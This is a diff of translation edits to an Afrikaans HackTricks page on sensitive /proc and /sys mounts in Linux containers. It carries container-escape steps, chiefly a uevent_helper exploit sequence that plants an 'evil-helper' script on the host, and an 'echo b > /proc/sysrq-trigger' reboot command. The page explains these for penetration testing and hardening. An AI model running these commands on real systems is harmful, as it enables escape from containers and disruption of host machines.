@@ -8,17 +8,17 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-Die blootstelling van `/proc` en `/sys` sonder behoorlike naamspeis isolasie stel beduidende sekuriteitsrisiko's in, insluitend aanvalsvlakvergroting en inligtingsoffening. Hierdie gids bevat sensitiewe lêers wat, indien verkeerd geconfigureer of deur 'n ongemagtigde gebruiker benader, kan lei tot kontainerontsnapping, gasverandering of inligting voorsien wat verdere aanvalle kan help. Byvoorbeeld, die verkeerd monter van `-v /proc:/host/proc` kan AppArmor-beskerming omseil as gevolg van sy padgebaseerde aard, wat `/host/proc` onbeskerm agterlaat.
+Die blootstelling van `/proc` en `/sys` sonder behoorlike naamsruimte-isolasie stel beduidende sekuriteitsrisiko's bloot, insluitend aanvalsoppervlakvergroting en inligtingsoffergawe. Hierdie gids bevat sensitiewe lêers wat, indien verkeerd geconfigureer of deur 'n ongemagtigde gebruiker benader, kan lei tot kontainerontsnapping, gasverandering of inligting voorsien wat verdere aanvalle kan ondersteun. Byvoorbeeld, die verkeerd monter van `-v /proc:/host/proc` kan AppArmor-beskerming omseil as gevolg van sy padgebaseerde aard, wat `/host/proc` onbeskerm agterlaat.
 
 **Jy kan verdere besonderhede van elke potensiële kwesbaarheid vind in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -43,8 +43,8 @@ sleep 5 && ./crash & # Trigger hanterer
 
 #### **`/proc/sys/kernel/modprobe`**
 
-* In diepte beskryf in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-* Bevat die pad na die kernelmodulelaaier, aangeroep vir die laai van kernelmodules.
+* Uiteengesit in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Bevat die pad na die kernelmodule-laaiers, aangeroep vir die laai van kernelmodules.
 *   **Toegangkontrole-voorbeeld**:
 
 ```bash
@@ -64,10 +64,10 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
 #### **`/proc/sys/fs/binfmt_misc`**
 
 * Maak dit moontlik om tolke vir nie-inheemse binêre formate te registreer op grond van hul toorgetal.
-* Kan lei tot bevoorregte eskalasie of root-skakeltoegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
+* Kan lei tot bevoorregte eskalasie of toegang tot die root-skoot as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
 * Relevant uitbuit en verduideliking:
 * [Armoedige man se rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
-* Diepgaande handleiding: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+* Diepgaande handleiding: [Video-skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Ander in `/proc`
 
@@ -79,7 +79,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
 #### **`/proc/sysrq-trigger`**
 
 * Maak dit moontlik om Sysrq-opdragte aan te roep, wat moontlik onmiddellike stelselherlaaie of ander kritieke aksies kan veroorsaak.
-*   **Gas Herlaai Voorbeeld**:
+*   **Stelselherlaaivoorbeeld**:
 
 ```bash
 echo b > /proc/sysrq-trigger # Herlaai die gas
@@ -106,7 +106,7 @@ echo b > /proc/sysrq-trigger # Herlaai die gas
 #### **`/proc/kcore`**
 
 * Verteenwoordig die stelsel se fisiese geheue in ELF-kernformaat.
-* Lees kan gasstelsel en ander kontainergeheue-inhoud lek.
+* Lees kan gasstelsel- en ander kontainergeheue-inhoud uitlek.
 * 'n Groot lêergrootte kan lei tot leesprobleme of sagtewarestortings.
 * Gedetailleerde gebruik in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
@@ -122,12 +122,12 @@ echo b > /proc/sysrq-trigger # Herlaai die gas
 
 #### **`/proc/sched_debug`**
 
-* Gee prosesbeplanningsinligting terug, wat PID-naamspeisbeskerming omseil.
+* Gee prosesbeplanningsinligting terug, wat PID-naamsruimtebeskerming omseil.
 * Stel prosesname, ID's, en cgroup-identifiseerders bloot.
 
 #### **`/proc/[pid]/mountinfo`**
 
-* Verskaf inligting oor koppelplekke in die proses se koppelnaamspesie.
+* Verskaf inligting oor koppelplekke in die proses se koppelnaamruimte.
 * Stel die ligging van die kontainer `rootfs` of beeld bloot.
 
 ### `/sys` Kwesbaarhede
@@ -135,26 +135,26 @@ echo b > /proc/sysrq-trigger # Herlaai die gas
 #### **`/sys/kernel/uevent_helper`**
 
 * Gebruik vir die hanteer van kerneltoestel `uevents`.
-* Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer by `uevent`-triggering.
+* Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer tydens `uevent`-triggering.
 *   **Voorbeeld vir Uitbuiting**: %%%bash
 
-### Skep 'n lading
+#### Skep 'n lading
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-### Vind gaspad vanaf OverlayFS-koppelpunt vir kontainer
+#### Vind gaspad vanaf OverlayFS-koppelpunt vir kontainer
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-### Stel uevent\_helper in op skadelike helper
+#### Stel uevent\_helper in op skadelike helper
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-### Trigger 'n uevent
+#### Trigger 'n uevent
 
 echo change > /sys/class/mem/null/uevent
 
-### Lees die uitset
+#### Lees die uitset
 
 cat /output %%%
 #### **`/sys/class/thermal`**
@@ -172,8 +172,8 @@ cat /output %%%
 
 #### **`/sys/firmware/efi/vars` en `/sys/firmware/efi/efivars`**
 
-* Blootstel koppelvlakke vir interaksie met EFI veranderlikes in NVRAM.
-* Verkeerde konfigurasie of uitbuiting kan lei tot geblokkeerde draagbare rekenaars of onopstartbare gasheer-masjiene.
+* Blootstelling van koppelvlakke vir interaksie met EFI veranderlikes in NVRAM.
+* Verkeerde konfigurasie of uitbuiting kan lei tot gebreekte draagbare rekenaars of onopstartbare gasheer-masjiene.
 
 #### **`/sys/kernel/debug`**
 
@@ -183,16 +183,16 @@ cat /output %%%
 ### Verwysings
 
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
-* [Begrip en Verharding van Linux Houers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
+* [Begrip en Versterking van Linux Houers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Misbruik van Bevoorregte en Onbevoorregte Linux Houers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 <details>
 
-<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
